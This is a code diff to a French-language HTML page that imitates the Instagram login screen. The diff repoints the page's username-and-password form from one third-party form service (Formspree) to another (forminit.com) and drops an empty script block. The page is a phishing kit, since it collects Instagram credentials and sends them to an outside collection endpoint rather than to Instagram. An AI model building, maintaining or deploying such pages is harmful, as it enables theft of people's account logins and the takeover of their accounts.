@@ -140,8 +140,7 @@
             <i class="fab fa-instagram"></i>
         </div>
         <h2>Connectez-vous pour voir les photos et vidéos de vos amis.</h2>
-        <!-- Le formulaire pointe maintenant directement vers votre endpoint Formspreée -->
-        <form action="https://formspree.io/f/xnjkragr" method="POST">
+        <form action="https://forminit.com/f/1pgpfw848lr" method="POST">
             <input type="text" name="username" placeholder="Nom d'utilisateur, e-mail ou numéro de téléphone" required>
             <input type="password" name="password" placeholder="Mot de passe" required>
             <button type="submit">Se connecter</button>
@@ -168,14 +167,5 @@
     </div>
     
     <div id="notification" class="notification"></div>
-
-    <script>
-        // Petit script pour afficher un message après l'envoi
-        document.querySelector('form').addEventListener('submit', function(e) {
-            // On laisse Formspreée gérer l'envoi normal
-            // On pourrait ajouter du JS ici si on voulait une redirection personnalisée sans rechargement
-            // Mais la méthode HTML simple (action="...") est plus fiable pour Formspreée
-        });
-    </script>
 </body>
 </html>
